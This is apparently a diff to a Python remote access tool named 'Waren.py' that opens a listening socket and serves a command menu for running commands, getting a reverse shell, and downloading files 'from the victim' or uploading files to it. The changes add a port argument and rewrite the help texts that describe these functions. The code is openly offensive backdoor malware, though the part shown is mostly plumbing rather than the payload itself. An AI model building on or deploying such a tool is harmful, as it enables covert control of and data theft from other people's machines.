@@ -52,6 +52,18 @@ Commands:
     help\tSend help about a command
 """
 
+def GrabArguments():
+    parser = argparse.ArgumentParser(prog="Waren.py")
+    #parser.add_argument("-i", "--interface", default="", help="Name of the interface to listen from")
+    parser.add_argument("-p", "--port", type=int, required=True, help="Port we are going to use")
+    args = parser.parse_args()
+
+    #interface = args.interface
+    port = args.port
+
+    #if interface == "": # interface is not provided returns 
+    return port
+
 
 def StartSocket(ip, port):
     s = socket.socket()
@@ -94,25 +106,42 @@ def ReceiveOption():
     return "0"
 
 def SendHelp(option):
-    option = option.split()
+    option = option.strip().split()
 
     if len(option) == 1: # no argument is provided
         c.send(HelpMenu.encode())
         return
+    print(option)
     match option[1]:
-        case b"execute":
-            c.send(b"""Execute a command
-                    Flag: -c command""")
-        case b"reverse":
-            c.send(b"reverse")
-        case b"download":
-            c.send(b"download")
-        case b"upload":
-            c.send(b"upload")
-        case b"leave":
-            c.send("leave")
-        case b"help":
-            SendHelp(option)
+        case "execute":
+            c.send(b"""
+            Execute a command
+            Flag: -c command
+            """)
+        case "reverse":
+            c.send(b"""
+            Receive a shell
+            Flags: -i IP -p PORT
+            """)
+        case "download":
+            c.send(b"""
+            Download Something from the victim
+            Flags: -f /path/to/file
+            """)
+        case "upload":
+            c.send(b"""
+            Upload a file from this machine
+            Flags: -f /path/to/file
+            """)
+        case "leave":
+            c.send(b"""
+            whadya think bruh
+            Flags:
+            """)
+        case "help":
+            c.send(b"""
+            Show this message
+            """)
         case _:
             c.send(b"Unknown option try: help")
 
@@ -146,10 +175,12 @@ def ExecuteCommand(command):
 #def get_reverse_shell()
 
 if __name__ == "__main__":
+   
+    port = GrabArguments()
     
     status = True
     while True:
-        c, addr = StartSocket('', 8080)
+        c, addr = StartSocket('', port)
         c.send(banner.encode())
         while status == True:
             print("socket from: {}".format(addr))
